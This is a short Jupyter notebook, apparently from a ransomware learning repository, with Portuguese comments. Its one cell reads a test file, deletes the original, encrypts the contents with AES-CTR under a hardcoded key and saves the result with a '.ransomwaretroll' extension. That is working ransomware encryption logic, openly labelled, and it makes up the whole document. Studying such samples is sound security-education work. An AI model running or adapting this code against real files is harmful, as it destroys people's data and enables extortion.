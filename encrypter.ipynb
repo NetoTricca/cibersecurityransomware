{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "156034c1",
   "metadata": {},
   "outputs": [],
   "source": [
    "## importando bibliotecas\n",
    "import os\n",
    "import pyaes\n",
    "\n",
    "## abrir o arquivo a ser criptografado\n",
    "file_name = \"teste.txt\"\n",
    "file = open(file_name, \"rb\")\n",
    "file_data = file.read()\n",
    "file.close()\n",
    "\n",
    "## remover o arquivo\n",
    "os.remove(file_name)\n",
    "\n",
    "## chave de criptografia\n",
    "key = b\"testeransomwares\"\n",
    "aes = pyaes.AESModeOfOperationCTR(key)\n",
    "\n",
    "## criptografar o arquivo\n",
    "crypto_data = aes.encrypt(file_data)\n",
    "\n",
    "## salvar o arquivo criptografado\n",
    "new_file = file_name + \".ransomwaretroll\"\n",
    "new_file = open(f'{new_file}','wb')\n",
    "new_file.write(crypto_data)\n",
    "new_file.close()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
